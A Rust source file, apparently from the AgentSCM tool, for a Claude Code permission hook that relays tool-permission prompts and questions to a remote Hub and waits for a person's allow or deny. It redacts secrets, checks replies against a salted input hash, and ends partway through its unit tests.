//! Letting the person answer a Claude Code permission prompt or question from the Hub.
//!
//! The `PermissionRequest` hook already told the Hub the session waits (see `coordinate`). Here
//! the hook goes on to register the prompt it is showing and to wait for an answer, all while
//! the dialog stays usable in the session. Everything the Hub is told about the tool is made on
//! this machine: its name, what to show of it (a command, a path, an address, with secrets
//! redacted), what the person can pick (the host's own "do not ask again" suggestions, a
//! question's options) and a salted hash of the tool input.
//!
//! The Hub is never trusted to compose the answer. The hook prints a decision only for a reply
//! that names this hook's own request id and input hash, and makes it from its own copies: a
//! choice or an option arrives as a position, and the rule that is saved or the label that is
//! returned is the one the host gave this hook. The only words taken from the Hub are what the
//! person typed (a reason with a deny, an answer to a question), bounded and without control
//! characters. Anything else, and every failure, prints the ordinary reply, which carries no
//! decision, so the dialog decides.
use std::path::Path;
use std::time::{Duration, Instant};

use agentscm::hook_relay::REPLY_BYTES;
use agentscm::hub::forge_http::{self, send};
use agentscm::redact::redact_json;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};

/// Local switch for a machine that does not want its Hub to approve anything. There is no opt-in.
const OFF_SWITCH: &str = "AGENTSCM_REMOTE_ANSWERS";
/// Test-only way to shorten (never lengthen) the hook's bound.
const BOUND_OVERRIDE: &str = "AGENTSCM_TEST_PERMISSION_BOUND_MS";
/// The host's hook timeout is 12 hours; the hook ends itself a minute earlier.
const HOOK_BOUND: Duration = Duration::from_secs(43_140);
/// The Hub confirms a shown prompt within seconds; a request still unconfirmed this long after
/// the hook started belongs to a run with nobody at a dialog.
const UNCONFIRMED_GIVE_UP: Duration = Duration::from_secs(20);
const POLL_SECONDS: u64 = 25;
const CALL_TIMEOUT: Duration = Duration::from_secs(30);
const RETRY_PAUSE: Duration = Duration::from_secs(5);
/// The longest pause between tries while the Hub cannot be reached.
const MAX_RETRY_PAUSE: Duration = Duration::from_secs(60);
const MAX_SESSION_BYTES: usize = 1024;
const MAX_AGENT_ID_BYTES: usize = 128;
const MAX_TOOL_BYTES: usize = 128;
/// Characters of the display sent; the Hub cuts at the same bound. Room for a long tool input
/// (a brief for a new session, a message to send), which the person reads in full before allowing.
const MAX_DISPLAY_CHARS: usize = 20_000;
const MAX_SUMMARY_CHARS: usize = 200;
/// Unshown parts a request names, and the characters sent of each name; the Hub's bounds.
const MAX_UNSHOWN: usize = 16;
const MAX_UNSHOWN_CHARS: usize = 64;
/// The unshown part of a request that has an input and nothing to show of it.
const WHOLE_INPUT: &str = "the request's input";
/// Input fields that name what a call is about, in the order tried.
const TITLE_FIELDS: [&str; 4] = ["title", "name", "subject", "description"];
/// What the model sees when the person denies from the Hub with nothing typed.
const DENY_MESSAGE: &str = "Denied from the AgentSCM Hub by its person.";
/// What goes before the reason the person typed with a deny.
const DENY_WITH_REASON: &str = "Denied from the AgentSCM Hub by its person, who says:";
/// The host's tool for asking the person a question.
const QUESTION_TOOL: &str = "AskUserQuestion";
/// How many of the host's suggestions are offered with Allow, how many questions and options one
/// prompt may have, and the characters sent of a question, an option or what a choice saves.
const MAX_CHOICES: usize = 8;
const MAX_QUESTIONS: usize = 4;
const MAX_OPTIONS: usize = 8;
const MAX_OFFER_CHARS: usize = 500;
/// Characters taken of what the person typed on the Hub: a reason with a deny, or an answer.
const MAX_TYPED_CHARS: usize = 2000;
const HASH_DOMAIN: &[u8] = b"agentscm.permission.v1\0";

/// Whether this hook call should offer its prompt to the Hub.
pub(super) fn applies(agent: &str, client_connection: bool, payload: &Value) -> bool {
    applies_with(
        agent,
        client_connection,
        payload,
        std::env::var(OFF_SWITCH).ok().as_deref(),
    )
}

fn applies_with(
    agent: &str,
    client_connection: bool,
    payload: &Value,
    switch: Option<&str>,
) -> bool {
    agent == "claude"
        && client_connection
        && switch.is_none_or(|value| value.trim() != "0")
        && payload["hook_event_name"] == "PermissionRequest"
        // The host holds a subagent's dialog until this hook returns, so waiting here would only
        // delay the person at the keyboard; those prompts are answered in the session.
        && payload["agent_id"].as_str().is_none_or(str::is_empty)
        && tool_of(payload).is_some()
        && session_of(payload).is_some()
}

fn session_of(payload: &Value) -> Option<&str> {
    payload["session_id"].as_str().filter(|id| {
        (1..=MAX_SESSION_BYTES).contains(&id.len()) && !id.chars().any(char::is_control)
    })
}

/// The tool the prompt is for. The host's question tool is one of them.
fn tool_of(payload: &Value) -> Option<&str> {
    payload["tool_name"].as_str().filter(|tool| {
        (1..=MAX_TOOL_BYTES).contains(&tool.len())
            && tool
                .bytes()
                .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b':' | b'-'))
    })
}

/// Named the way the Hub records the asker: a subagent's id, or none for the lead.
fn agent_id_of(payload: &Value) -> Option<&str> {
    payload["agent_id"].as_str().filter(|id| {
        (1..=MAX_AGENT_ID_BYTES).contains(&id.len()) && !id.chars().any(char::is_control)
    })
}

/// What the person is shown of the tool request, and what of it they are not shown. They may
/// allow it either way: the request is their own agent's, and the page says what is missing.
#[derive(Debug, Default, PartialEq, Eq)]
struct Display {
    text: String,
    /// Characters the text had before it was cut to the bound; none when it was not cut.
    cut_from: Option<usize>,
    /// Secrets replaced in the text.
    redacted: usize,
    /// Parts of the request the text leaves out, by name.
    unshown: Vec<String>,
    /// The change itself (an edit's content) is not part of the text.
    content_hidden: bool,
}

/// One text for the person: the command in full for a shell, the path for an edit (never its
/// content), the address for a fetch, and the input of any other tool, all with secrets redacted.
fn display_line(tool: &str, input: &Value, cwd: &str) -> Display {
    let field = |key: &str| input[key].as_str();
    let relative = |path: &str| -> String {
        match Path::new(path).strip_prefix(cwd) {
            Ok(inside) if !cwd.is_empty() && !inside.as_os_str().is_empty() => {
                inside.display().to_string()
            }
            _ => path.to_owned(),
        }
    };
    let with_path = |main: &str| match field("path") {
        Some(path) => format!("{main} in {}", relative(path)),
        None => main.to_owned(),
    };
    let text = |text: Option<String>| text.map(Value::String);
    // What is shown of each tool, and `covered`: the input's fields that this shows or that
    // change nothing a person decides on. Any other field present is named as unshown (for a
    // shell command, a sandbox override). With no `covered` no field is named: the whole input
    // is shown, or `content_hidden` already says the change is not.
    let (mut shown, covered, content_hidden) = match tool {
        "Bash" => (
            text(field("command").map(str::to_owned)),
            Some(&["command", "description", "timeout", "run_in_background"][..]),
            false,
        ),
        "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => (
            text(field("file_path").or(field("notebook_path")).map(relative)),
            None,
            true,
        ),
        "Read" => (
            text(field("file_path").map(relative)),
            Some(&["file_path", "offset", "limit", "pages"][..]),
            false,
        ),
        "Glob" | "Grep" => (
            text(field("pattern").map(with_path)),
            Some(&["pattern", "path"][..]),
            false,
        ),
        "WebFetch" => (
            text(field("url").map(|url| shaped_url(url).0)),
            Some(&["url"][..]),
            false,
        ),
        "WebSearch" => (
            text(field("query").map(str::to_owned)),
            Some(&["query"][..]),
            false,
        ),
        _ if input.is_null() => (None, None, false),
        // Any other tool, a subagent's start and an MCP server's tools included: its whole
        // input, as indented JSON below.
        _ => (Some(input.clone()), None, false),
    };
    let mut unshown: Vec<String> = match (covered, input.as_object()) {
        (Some(covered), Some(map)) => map
            .keys()
            .filter(|key| !covered.contains(&key.as_str()))
            .cloned()
            .collect(),
        _ => Vec::new(),
    };
    if tool == "WebFetch"
        && let Some(url) = field("url")
    {
        unshown.extend(shaped_url(url).1.into_iter().map(str::to_owned));
    }
    // The same redaction as everything else that leaves this machine. It can hide the very part
    // that matters (`TOKEN=$(…)`), so the person is told how many secrets were replaced.
    let mut redacted = shown.as_mut().map_or(0, redact_json);
    let shown = shown
        .and_then(|value| match value {
            Value::String(text) => Some(text),
            other => serde_json::to_string_pretty(&other).ok(),
        })
        .filter(|text| !text.trim().is_empty());
    // With nothing to show of a request that has an input, the person sees only the tool and
    // is told that the input is not shown.
    if shown.is_none() && input.as_object().is_some_and(|map| !map.is_empty()) {
        unshown = vec![WHOLE_INPUT.to_owned()];
    }
    let shown = shown.unwrap_or_else(|| tool.to_owned());
    let (unshown, in_names) = named(unshown);
    redacted += in_names;
    let chars = shown.chars().count();
    let cut = chars > MAX_DISPLAY_CHARS;
    Display {
        text: if cut {
            shown.chars().take(MAX_DISPLAY_CHARS).collect()
        } else {
            shown
        },
        cut_from: cut.then_some(chars),
        redacted,
        unshown,
        content_hidden,
    }
}

/// The names of what is not shown, as they leave the machine: at most [`MAX_UNSHOWN`], each a
/// short line with secrets redacted like the display's. Also returns how many were replaced.
fn named(mut names: Vec<String>) -> (Vec<String>, usize) {
    if names.len() > MAX_UNSHOWN {
        let more = names.len() - (MAX_UNSHOWN - 1);
        names.truncate(MAX_UNSHOWN - 1);
        names.push(format!("and {more} more"));
    }
    let mut names = Value::from(names);
    let redacted = redact_json(&mut names);
    let names = names
        .as_array()
        .into_iter()
        .flatten()
        .filter_map(Value::as_str)
        .map(|name| name.chars().take(MAX_UNSHOWN_CHARS).collect())
        .collect();
    (names, redacted)
}

/// One plain line saying what the call does, for a person who is not looking at the session:
/// "run a shell command: Publish the crate", "use start session (ccd_session): Fix the login".
/// A label beside the display, never a replacement for it; secrets are redacted like the display's.
fn summary(tool: &str, input: &Value) -> String {
    let field = |key: &str| {
        input[key]
            .as_str()
            .map(str::trim)
            .filter(|text| !text.is_empty())
    };
    let file = |key: &str| {
        field(key).and_then(|path| Path::new(path).file_name()?.to_str().map(str::to_owned))
    };
    let (what, about) = match tool {
        "Bash" => (
            "run a shell command".to_owned(),
            field("description").map(str::to_owned),
        ),
        "Edit" | "MultiEdit" => ("edit a file".to_owned(), file("file_path")),
        "NotebookEdit" => ("edit a notebook".to_owned(), file("notebook_path")),
        "Write" => ("write a file".to_owned(), file("file_path")),
        "Read" => ("read a file".to_owned(), file("file_path")),
        "Glob" | "Grep" => (
            "search files".to_owned(),
            field("pattern").map(str::to_owned),
        ),
        "WebFetch" => (
            "fetch a web page".to_owned(),
            field("url").map(|url| shaped_url(url).0),
        ),
        "WebSearch" => (
            "search the web".to_owned(),
            field("query").map(str::to_owned),
        ),
        "Task" | "Agent" => (
            "start a subagent".to_owned(),
            field("description").map(str::to_owned),
        ),
        QUESTION_TOOL => (
            "ask you a question".to_owned(),
            input["questions"][0]["question"]
                .as_str()
                .map(str::to_owned),
        ),
        _ => {
            // An MCP tool is `mcp__<server>__<tool>`; its words read better without underscores.
            let what = match tool
                .strip_prefix("mcp__")
                .and_then(|rest| rest.split_once("__"))
            {
                Some((server, name)) => format!("use {} ({server})", name.replace('_', " ")),
                None => format!("use {tool}"),
            };
            let about = TITLE_FIELDS.iter().find_map(|key| field(key));
            (what, about.map(str::to_owned))
        }
    };
    let line = match about {
        Some(about) => format!("{what}: {about}"),
        None => what,
    };
    one_line(&line, MAX_SUMMARY_CHARS)
}

/// A label as it leaves the machine: one line, secrets redacted like the display's, at most
/// `max` characters.
fn one_line(text: &str, max: usize) -> String {
    let mut line = Value::String(text.split_whitespace().collect::<Vec<_>>().join(" "));
    redact_json(&mut line);
    let line = line.as_str().unwrap_or_default();
    if line.chars().count() <= max {
        return line.to_owned();
    }
    let kept: String = line.chars().take(max - 1).collect();
    format!("{kept}…")
}

/// What the person can pick beyond a plain allow or deny, read on this machine from the host's
/// own hook input. An answer from the Hub names one of these by position only: the rule that is
/// saved and the input that is returned are this hook's own copies.
#[derive(Debug, Default, PartialEq, Eq)]
struct Offer {
    /// The host's suggestions that can go with an allow: each one's position in
    /// `permission_suggestions`, what it is called, and exactly what it saves and where.
    choices: Vec<(usize, &'static str, String)>,
    /// The questions of a question prompt, as the host wrote them.
    questions: Vec<Asked>,
}

#[derive(Debug, PartialEq, Eq)]
struct Asked {
    question: String,
    header: String,
    /// Each option's label and description.
    options: Vec<(String, String)>,
    multiple: bool,
}

/// `None` for a question prompt whose questions are not in the shape the host documents: it
/// could not be answered, so it is left to the session.
fn offer(tool: &str, payload: &Value) -> Option<Offer> {
    let choices = payload["permission_suggestions"]
        .as_array()
        .map_or_else(Vec::new, |all| {
            all.iter()
                .enumerate()
                .filter_map(|(index, suggestion)| {
                    let (label, saves) = choice(suggestion)?;
                    Some((index, label, saves))
                })
                .take(MAX_CHOICES)
                .collect()
        });
    let questions = if tool == QUESTION_TOOL {
        asked(&payload["tool_input"])?
    } else {
        Vec::new()
    };
    Some(Offer { choices, questions })
}

/// What one of the host's suggestions is called, and exactly what it saves and where. `None` for
/// a kind this hook cannot describe, which is then not offered: a button must say what it does.
fn choice(suggestion: &Value) -> Option<(&'static str, String)> {
    let text = |key: &str| suggestion[key].as_str();
    let kept = match text("destination")? {
        "session" => "for this session only",
        "localSettings" => "in this checkout's local settings (.claude/settings.local.json)",
        "projectSettings" => "in this project's shared settings (.claude/settings.json)",
        "userSettings" => "in your user settings (~/.claude/settings.json)",
        _ => return None,
    };
    let (label, what) = match text("type")? {
        "addRules" if text("behavior") == Some("allow") => {
            let rules = suggestion["rules"]
                .as_array()
                .filter(|rules| !rules.is_empty())?;
            let rules: Option<Vec<String>> = rules
                .iter()
                .map(|rule| {
                    let tool = rule["toolName"].as_str()?;
                    Some(match rule["ruleContent"].as_str() {
                        Some(content) => format!("{tool}({content})"),
                        None => tool.to_owned(),
                    })
                })
                .collect();
            (
                "Allow, and do not ask again for this",
                format!("the rule {}", rules?.join(", ")),
            )
        }
        "addDirectories" => {
            let folders = suggestion["directories"]
                .as_array()
                .filter(|folders| !folders.is_empty())?;
            let folders: Option<Vec<&str>> = folders.iter().map(Value::as_str).collect();
            (
                "Allow, and allow access to the folder",
                format!("access to {}", folders?.join(", ")),
            )
        }
        "setMode" if text("mode") == Some("acceptEdits") => (
            "Allow, and accept edits without asking",
            "accept edits mode".to_owned(),
        ),
        _ => return None,
    };
    // The person must read all of what they save. A description that redaction, the cut or a
    // line break changed says less than the rule holds, so that suggestion is not offered.
    let saves = format!("{what}, {kept}");
    let hidden = saves
        .chars()
        .any(|c| c.is_control() || (c.is_whitespace() && c != ' '));
    (!hidden && one_line(&saves, MAX_OFFER_CHARS) == saves).then_some((label, saves))
}

fn asked(input: &Value) -> Option<Vec<Asked>> {
    let filled = |value: &Value| {
        value
            .as_str()
            .filter(|text| !text.trim().is_empty())
            .map(str::to_owned)
    };
    let questions = input["questions"]
        .as_array()
        .filter(|all| (1..=MAX_QUESTIONS).contains(&all.len()))?;
    // Answers go back keyed by the question's text, so two questions cannot share one.
    let texts: Vec<&Value> = questions.iter().map(|q| &q["question"]).collect();
    if texts
        .iter()
        .enumerate()
        .any(|(n, text)| texts[..n].contains(text))
    {
        return None;
    }
    questions
        .iter()
        .map(|question| {
            let options = question["options"]
                .as_array()
                .filter(|all| (1..=MAX_OPTIONS).contains(&all.len()))?;
            let options: Option<Vec<(String, String)>> = options
                .iter()
                .map(|option| {
                    let description = option["description"].as_str().unwrap_or_default();
                    Some((filled(&option["label"])?, description.to_owned()))
                })
                .collect();
            Some(Asked {
                question: filled(&question["question"])?,
                header: question["header"].as_str().unwrap_or_default().to_owned(),
                options: options?,
                multiple: question["multiSelect"].as_bool().unwrap_or(false),
            })
        })
        .collect()
}

/// The offer as the Hub is told it: labels for the person's page, redacted and cut like every
/// other label. Positions stay those of [`Offer`].
fn offer_fields(offer: &Offer, body: &mut Value) {
    let text = |text: &str| one_line(text, MAX_OFFER_CHARS);
    if !offer.choices.is_empty() {
        body["choices"] = offer
            .choices
            .iter()
            .map(|(_, label, saves)| json!({"label": label, "saves": saves}))
            .collect();
    }
    if !offer.questions.is_empty() {
        body["questions"] = offer
            .questions
            .iter()
            .map(|asked| {
                let options: Vec<Value> = asked
                    .options
                    .iter()
                    .map(|(label, description)| {
                        json!({"label": text(label), "description": text(description)})
                    })
                    .collect();
                json!({
                    "question": text(&asked.question),
                    "header": text(&asked.header),
                    "options": options,
                    "multiple": asked.multiple,
                })
            })
            .collect();
    }
}

/// `scheme://host/path` without userinfo, query or fragment, and the names of the parts dropped.
fn shaped_url(url: &str) -> (String, Vec<&'static str>) {
    let Some((scheme, rest)) = url.split_once("://") else {
        return (url.to_owned(), Vec::new());
    };
    let cut = rest.find(['?', '#']).unwrap_or(rest.len());
    let (rest, tail) = rest.split_at(cut);
    let (authority, path) = rest.split_at(rest.find('/').unwrap_or(rest.len()));
    let (sign_in, host) = match authority.rfind('@') {
        Some(at) => (true, &authority[at + 1..]),
        None => (false, authority),
    };
    let dropped = [
        (sign_in, "the address's sign-in part"),
        (tail.starts_with('?'), "the address's query"),
        (tail.contains('#'), "the address's fragment"),
    ];
    (
        format!("{scheme}://{host}{path}"),
        dropped
            .into_iter()
            .filter_map(|(was, name)| was.then_some(name))
            .collect(),
    )
}

/// Binds a request to this process's prompt: the salt stays here, so the Hub can neither guess
/// the input from the hash nor answer for another prompt.
fn input_hash(
    salt: &[u8; 16],
    session: &str,
    agent_id: Option<&str>,
    tool: &str,
    input: &Value,
) -> String {
    let mut hasher = Sha256::new();
    hasher.update(HASH_DOMAIN);
    hasher.update(salt);
    for part in [
        session,
        "\0",
        agent_id.unwrap_or_default(),
        "\0",
        tool,
        "\0",
    ] {
        hasher.update(part.as_bytes());
    }
    hasher.update(serde_json::to_vec(input).unwrap_or_default());
    format!("{:x}", hasher.finalize())
}

/// What the person decided, as the Hub reports it. A choice and an option are positions in this
/// hook's own [`Offer`]; only typed text is the Hub's to send.
#[derive(Clone, Debug, PartialEq, Eq)]
enum Answer {
    Allow,
    /// Allow, with one of the offered choices.
    AllowWith(usize),
    /// The answers to a question prompt, one per question.
    Answers(Vec<Picked>),
    /// Deny, with what the person typed for the agent, if anything.
    Deny(Option<String>),
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Picked {
    Options(Vec<usize>),
    Text(String),
}

/// Text the person typed on the Hub for the agent, bounded here too: no control characters but
/// line breaks, and at most [`MAX_TYPED_CHARS`]. `None` when nothing is left or it is longer.
fn typed(text: &str) -> Option<String> {
    let text: String = text
        .chars()
        .filter(|c| *c == '\n' || !c.is_control())
        .collect();
    let text = text.trim();
    (!text.is_empty() && text.chars().count() <= MAX_TYPED_CHARS).then(|| text.to_owned())
}

fn picked(answer: &Value) -> Option<Picked> {
    if !only_keys(answer, &["options", "text"]) {
        return None;
    }
    match (answer.get("options"), answer.get("text")) {
        (Some(options), None) => options
            .as_array()
            .filter(|all| !all.is_empty())?
            .iter()
            .map(|option| usize::try_from(option.as_u64()?).ok())
            .collect::<Option<Vec<_>>>()
            .map(Picked::Options),
        (None, Some(text)) => typed(text.as_str()?).map(Picked::Text),
        _ => None,
    }
}

/// The decision this hook prints for an answer, made from its own copies of what was offered:
/// the host's own suggestion for a choice, the host's own questions and labels for answers. The
/// only words from the Hub are what the person typed. `None` when the answer does not fit this
/// prompt, which leaves it to the session.
fn decision_output(answer: &Answer, offer: &Offer, payload: &Value) -> Option<Value> {
    let question = !offer.questions.is_empty();
    let decision = match answer {
        // A question is answered, never just allowed: the host needs its answers.
        Answer::Allow if !question => json!({"behavior": "allow"}),
        Answer::AllowWith(choice) if !question => {
            let (index, ..) = offer.choices.get(*choice)?;
            let saved = payload["permission_suggestions"].get(*index)?;
            json!({"behavior": "allow", "updatedPermissions": [saved]})
        }
        Answer::Answers(picked) if question && picked.len() == offer.questions.len() => {
            let mut answers = serde_json::Map::new();
            for (asked, picked) in offer.questions.iter().zip(picked) {
                let answer = match picked {
                    Picked::Text(text) => text.clone(),
                    Picked::Options(options) => {
                        if options.len() > 1 && !asked.multiple {
                            return None;
                        }
                        let labels: Option<Vec<&str>> = options
                            .iter()
                            .map(|option| {
                                asked.options.get(*option).map(|(label, _)| label.as_str())
                            })
                            .collect();
                        labels?.join(", ")
                    }
                };
                answers.insert(asked.question.clone(), Value::String(answer));
            }
            // The whole input again, as the host asks, with the answers added.
            let mut input = payload["tool_input"].clone();
            input
                .as_object_mut()?
                .insert("answers".to_owned(), Value::Object(answers));
            json!({"behavior": "allow", "updatedInput": input})
        }
        Answer::Deny(None) => json!({"behavior": "deny", "message": DENY_MESSAGE}),
        Answer::Deny(Some(reason)) => {
            json!({"behavior": "deny", "message": format!("{DENY_WITH_REASON} {reason}")})
        }
        _ => return None,
    };
    Some(
        json!({"hookSpecificOutput": {"hookEventName": "PermissionRequest", "decision": decision}}),
    )
}

/// What a reply to register or poll means for the hook.
#[derive(Debug, PartialEq, Eq)]
enum Step {
    Wait {
        unconfirmed: bool,
    },
    Decide(Answer),
    /// A busy or unreachable Hub: try again shortly, for as long as the hook waits.
    Retry,
    Stop,
}

fn only_keys(reply: &Value, allowed: &[&str]) -> bool {
    reply
        .as_object()
        .is_some_and(|map| map.keys().all(|key| allowed.contains(&key.as_str())))
}

fn is_request_id(id: &str) -> bool {
    (1..=64).contains(&id.len()) && id.bytes().all(|b| b.is_ascii_hexdigit())
}

/// The request id of a registration whose reply echoes this hook's hash, and whether the Hub
/// still waits for the host to confirm the prompt.
fn registered(reply: Option<(u16, Value)>, hash: &str) -> Option<(String, bool)> {
    let (200, reply) = reply? else {
        return None;
    };
    if !only_keys(&reply, &["request_id", "input_hash", "state"]) || reply["input_hash"] != hash {
        return None;
    }
    let id = reply["request_id"]
        .as_str()
        .filter(|id| is_request_id(id))?;
    match reply["state"].as_str()? {
        "pending" => Some((id.to_owned(), false)),
        "unconfirmed" => Some((id.to_owned(), true)),
        _ => None,
    }
}

/// The answer in an answered reply: `allow` or `deny`, and at most what goes with it (a typed
/// reason with a deny; with an allow one choice, or the answers to a question). Anything else is
/// no answer.
fn answer_in(reply: &Value) -> Option<Answer> {
    let extra = |key: &str| reply.get(key).filter(|value| !value.is_null());
    let (reason, choice, answers) = (extra("reason"), extra("choice"), extra("answers"));
    match (reply["decision"].as_str()?, reason, choice, answers) {
        ("deny", None, None, None) => Some(Answer::Deny(None)),
        ("deny", Some(reason), None, None) => Some(Answer::Deny(Some(typed(reason.as_str()?)?))),
        ("allow", None, None, None) => Some(Answer::Allow),
        ("allow", None, Some(choice), None) => {
            Some(Answer::AllowWith(usize::try_from(choice.as_u64()?).ok()?))
        }
        ("allow", None, None, Some(answers)) => answers
            .as_array()?
            .iter()
            .map(picked)
            .collect::<Option<Vec<_>>>()
            .map(Answer::Answers),
        _ => None,
    }
}

/// Accepts a decision only from a 200 reply for this hook's own request id and hash, with exactly
/// one answer this hook knows and nothing else in it.
fn classify(reply: Option<(u16, Value)>, id: &str, hash: &str) -> Step {
    let Some((status, reply)) = reply else {
        return Step::Retry;
    };
    match status {
        200 => {}
        // 502 and 504 are a proxy in front of a Hub that is being replaced.
        429 | 502 | 503 | 504 => return Step::Retry,
        _ => return Step::Stop,
    }
    const KEYS: [&str; 7] = [
        "request_id",
        "input_hash",
        "state",
        "decision",
        "reason",
        "choice",
        "answers",
    ];
    if !only_keys(&reply, &KEYS) || reply["request_id"] != id || reply["input_hash"] != hash {
        return Step::Stop;
    }
    match (reply["state"].as_str(), reply["decision"].is_null()) {
        (Some("pending"), true) => Step::Wait { unconfirmed: false },
        (Some("unconfirmed"), true) => Step::Wait { unconfirmed: true },
        (Some("answered"), false) => answer_in(&reply).map_or(Step::Stop, Step::Decide),
        _ => Step::Stop,
    }
}

struct Hub {
    client: reqwest::Client,
    base: String,
    repo: String,
    token: String,
}

impl Hub {
    /// `None` when the call failed in transit; the reply otherwise, whatever its status.
    async fn post(&self, route: &str, body: &Value) -> Option<(u16, Value)> {
        let mut url = reqwest::Url::parse(&format!("{}{route}", self.base)).ok()?;
        url.query_pairs_mut().append_pair("repo", &self.repo);
        let request = self
            .client
            .post(url)
            .header(reqwest::header::CONTENT_TYPE, "application/json")
            .bearer_auth(&self.token)
            .body(serde_json::to_vec(body).ok()?)
            .timeout(CALL_TIMEOUT);
        send(request, REPLY_BYTES).await.ok()
    }
}

fn bound() -> Duration {
    std::env::var(BOUND_OVERRIDE)
        .ok()
        .and_then(|ms| ms.parse::<u64>().ok())
        .map_or(HOOK_BOUND, |ms| HOOK_BOUND.min(Duration::from_millis(ms)))
}

fn parent() -> u32 {
    #[cfg(unix)]
    {
        std::os::unix::process::parent_id()
    }
    #[cfg(not(unix))]
    {
        0
    }
}

/// The harness that started this hook is gone (a closed terminal), so nobody waits for it.
fn parent_gone(started_under: u32) -> bool {
    cfg!(unix) && parent() != started_under
}

/// Registers the prompt with the Hub and waits for the person's decision. Returns the decision
/// to print, or `fallback` (the ordinary reply, with no decision) on any failure, timeout or
/// when the session moved on.
pub(super) async fn await_answer(payload: &Value, started: Instant, fallback: Value) -> Value {
    run(payload, started).await.unwrap_or(fallback)
}

async fn run(payload: &Value, started: Instant) -> Option<Value> {
    let started_under = parent();
    let routed = super::route_client("claude", payload).ok()?;
    let token = crate::client_cli::read_token(&routed.connection.token_file).ok()?;
    if token.is_empty() {
        return None;
    }
    let (session, tool) = (session_of(payload)?, tool_of(payload)?);
    let agent_id = agent_id_of(payload);
    let input = &payload["tool_input"];
    let offer = offer(tool, payload)?;
    let mut salt = [0u8; 16];
    getrandom::fill(&mut salt).ok()?;
    let hash = input_hash(&salt, session, agent_id, tool, input);
    let shown = display_line(tool, input, payload["cwd"].as_str().unwrap_or_default());
    let mut body = json!({
        "session": session,
        "tool": tool,
        "summary": summary(tool, input),
        "display": shown.text,
        "missing": {
            "cut_from": shown.cut_from,
            "redacted": shown.redacted,
            "unshown": shown.unshown,
        },
        "content_hidden": shown.content_hidden,
        "input_hash": hash,
        // This hook passes on a reason the person types with a deny.
        "takes_reason": true,
    });
    offer_fields(&offer, &mut body);
    if let Some(agent_id) = agent_id {
        body["agent_id"] = json!(agent_id);
    }
    // Names the session to its person when it leads no Work: the folder they started it in.
    if let Some(folder) = routed.checkout.file_name().and_then(|name| name.to_str()) {
        body["folder"] = json!(folder);
    }
    let hub = Hub {
        client: forge_http::client().ok()?,
        base: routed.connection.hub.trim_end_matches('/').to_owned(),
        repo: routed.connection.repo.clone(),
        token,
    };
    let mut reply = hub.post("/v1/hub/permission/register", &body).await;
    let mut offer = offer;
    // A Hub from before choices and typed reasons refuses the fields it does not know. It can
    // still take a plain allow or deny, so it is offered the prompt without them. A question
    // cannot be answered that way and is left to the session.
    if matches!(reply, Some((400, _))) && offer.questions.is_empty() {
        let fields = body.as_object_mut()?;
        fields.remove("takes_reason");
        fields.remove("choices");
        offer = Offer::default();
        reply = hub.post("/v1/hub/permission/register", &body).await;
    }
    let (id, mut unconfirmed) = registered(reply, &hash)?;
    let until = started + bound();
    // Longer after each failure in a row, and never past the bound, so the hook ends on time.
    let pause = |tries: u32| {
        let wait = (RETRY_PAUSE * tries.max(1)).min(MAX_RETRY_PAUSE);
        tokio::time::sleep(wait.min(until.saturating_duration_since(Instant::now())))
    };
    let mut failures: u32 = 0;
    loop {
        let now = Instant::now();
        if now >= until || parent_gone(started_under) {
            return None;
        }
        let mut wait = POLL_SECONDS.min(until.saturating_duration_since(now).as_secs());
        if unconfirmed {
            let left = UNCONFIRMED_GIVE_UP.checked_sub(started.elapsed())?;
            if left.is_zero() {
                return None;
            }
            wait = wait.min(left.as_secs() + 1);
        }
        let poll = json!({"request_id": id, "input_hash": hash, "wait_seconds": wait});
        let asked = Instant::now();
        match classify(hub.post("/v1/hub/permission/poll", &poll).await, &id, &hash) {
            Step::Wait { unconfirmed: next } => {
                failures = 0;
                // A Hub with its poll slots full answers at once with nothing new; pause
                // rather than ask again immediately.
                let quick = asked.elapsed() < Duration::from_secs(1) && next == unconfirmed;
                unconfirmed = next;
                if quick {
                    pause(1).await;
                }
            }
            Step::Decide(answer) => return decision_output(&answer, &offer, payload),
            // The computer slept, the network dropped or the Hub is being replaced. The prompt
            // may still be on screen, so the hook keeps trying for its whole bound; the Hub
            // offers the request again once it hears this hook again.
            Step::Retry => {
                failures = failures.saturating_add(1);
                pause(failures).await;
            }
            Step::Stop => return None,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn line(tool: &str, input: Value) -> Display {
        display_line(tool, &input, "/work/acme")
    }

    #[test]
    fn applies_only_to_claude_prompts_on_the_plugin_route_with_the_switch_not_off() {
        let prompt = json!({
            "hook_event_name": "PermissionRequest", "session_id": "s", "tool_name": "Bash",
        });
        assert!(applies_with("claude", true, &prompt, None));
        assert!(applies_with("claude", true, &prompt, Some("1")));
        assert!(!applies_with("claude", true, &prompt, Some("0")));
        assert!(!applies_with("claude", false, &prompt, None));
        assert!(!applies_with("codex", true, &prompt, None));
        let mut subagent = prompt.clone();
        subagent["agent_id"] = json!("sub-1");
        assert!(!applies_with("claude", true, &subagent, None));
        subagent["agent_id"] = json!("");
        assert!(applies_with("claude", true, &subagent, None));
        let mut question = prompt.clone();
        question["tool_name"] = json!("AskUserQuestion");
        assert!(applies_with("claude", true, &question, None));
        let mut other = prompt.clone();
        other["hook_event_name"] = json!("Notification");
        assert!(!applies_with("claude", true, &other, None));
        let mut nameless = prompt.clone();
        nameless["session_id"] = json!("");
        assert!(!applies_with("claude", true, &nameless, None));
        let mut odd = prompt;
        odd["tool_name"] = json!("Ba sh");
        assert!(!applies_with("claude", true, &odd, None));
    }

    #[test]
    fn display_follows_the_rule_of_each_tool() {
        let bash = line("Bash", json!({"command": "git push\n  origin main"}));
        assert_eq!(
            bash,
            Display {
                text: "git push\n  origin main".into(),
                ..Display::default()
            }
        );
        // An edit shows its path (relative inside the working directory), never its content.
        let edit = line(
            "Edit",
            json!({"file_path": "/work/acme/src/a.rs", "old_string": "secret", "new_string": "x"}),
        );
        assert_eq!(
            edit,
            Display {
                text: "src/a.rs".into(),
                content_hidden: true,
                ..Display::default()
            }
        );
        let outside = line("Write", json!({"file_path": "/etc/hosts", "content": "x"}));
        assert_eq!(outside.text, "/etc/hosts");
        assert_eq!(
            line(
                "NotebookEdit",
                json!({"notebook_path": "/work/acme/n.ipynb"})
            )
            .text,
            "n.ipynb"
        );
        assert_eq!(
            line("Read", json!({"file_path": "/work/acme/README.md"})).text,
            "README.md"
        );
        assert_eq!(
